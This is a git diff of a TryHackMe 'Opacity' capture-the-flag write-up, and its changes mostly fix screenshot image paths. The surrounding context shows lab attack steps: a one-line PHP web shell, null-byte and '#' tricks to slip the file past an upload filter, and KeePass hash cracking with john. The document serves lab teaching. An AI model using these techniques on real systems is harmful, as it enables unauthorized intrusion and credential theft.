@@ -124,7 +124,7 @@ However, I tried to brute force SMB and SSH with that username, but no dice...
 
 **Home page:**
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/%2020230427142706.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427142706.png)
 
 When we go to `/`, it'll redirect us to `/login.php`.
 
@@ -163,13 +163,13 @@ When we go to `/`, it'll redirect us to `/login.php`.
 
 In `/login.php`, we can try to test SQL injection, and see if we can bypass the authentication:
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/%2020230427144924.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427144924.png)
 
 Nope.
 
 Alrightly, let's move on to `/cloud`:
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/%2020230427145149.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427145149.png)
 
 In here, we can upload an image via an ***external URL***!
 
@@ -184,11 +184,11 @@ Let's test for file upload vulnerability!
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/%2020230427150737.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427150737.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/%2020230427150747.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427150747.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/%2020230427150754.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427150754.png)
 
 ```shell
 ┌[siunam♥earth]-(~/ctf/thm/ctf/Opacity)-[2023.04.27|15:06:32(HKT)]
@@ -201,7 +201,7 @@ As you can see, it uploaded our image to `/cloud/images/image.jpg`.
 
 And we can view the uploaded image in `/cloud/storage.php`:
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/%2020230427151041.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427151041.png)
 
 ## Initial Foothold
 
@@ -212,7 +212,7 @@ Now, **what if we upload a PHP web shell??**
 └> echo '<?php system($_GET["cmd"]); ?>' > webshell.php
 ```
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/%2020230427151343.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427151343.png)
 
 ```shell
 ┌[siunam♥earth]-(~/ctf/thm/ctf/Opacity)-[2023.04.27|15:06:32(HKT)]
@@ -232,11 +232,11 @@ Hmm... Let's try using the **null byte (`%00`) technique** to bypass blacklist e
 └> mv webshell.php "webshell.php%00.jpg"
 ```
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/%2020230427154205.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427154205.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/%2020230427154210.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427154210.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/%2020230427154215.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427154215.png)
 
 The file is uploaded!!
 
@@ -265,13 +265,13 @@ It returns a 404 status code.
 
 **We can just add the null byte in the form's input box!**
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/%2020230427155406.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427155406.png)
 
 However, this still doesn't work.
 
 **After fumbling around, I added a PHP comment (`#`) to the input box, and it's uploaded!**
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/%2020230427160058.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427160058.png)
 
 ```shell
 ┌[siunam♥earth]-(~/ctf/thm/ctf/Opacity)-[2023.04.27|16:02:03(HKT)]
@@ -429,9 +429,9 @@ drwxr-xr-x 14 root root 4.0K Jul 26  2022 ..
 
 **Let's login in the `/login.php`!**
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/%2020230427162933.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427162933.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/%2020230427162944.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427162944.png)
 
 However, nothing weird here.
 
@@ -469,7 +469,7 @@ Hmm... I wonder if can we open that database, and view some passwords!
 
 **According to [HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force#keepass), we can use `keepass2john` and `john` to crack it's database hash:**
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/%2020230427163452.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427163452.png)
 
 ```shell
 ┌[siunam♥earth]-(~/ctf/thm/ctf/Opacity)-[2023.04.27|16:36:05(HKT)]
@@ -495,17 +495,17 @@ Let's open the Keepass database!
 └> keepass2
 ```
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/%2020230427164731.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427164731.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/%2020230427164758.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427164758.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/%2020230427164905.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427164905.png)
 
 **Copy the password:**
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/%2020230427164922.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427164922.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/%2020230427164933.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427164933.png)
 
 **Now we can SSH into user `sysadmin`!!**
 ```shell
